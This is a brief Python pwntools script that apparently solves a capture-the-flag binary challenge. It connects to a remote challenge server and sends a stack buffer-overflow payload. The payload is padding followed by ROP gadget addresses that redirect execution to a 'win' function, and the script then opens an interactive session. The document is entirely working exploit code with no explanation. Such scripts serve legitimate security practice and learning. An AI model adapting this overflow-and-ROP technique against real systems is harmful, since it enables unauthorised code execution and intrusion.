from pwn import *

io = remote("challs.pwnoh.io", 13402)

popebx = 0x08049022
win = 0x804922a
ret = 0x0804900e

payload = b"A"*0x1c + p32(popebx) + p32(0x804a025 + 0x1fdb) + p32(ret) + p32(win)
io.sendline(payload)

io.interactive()

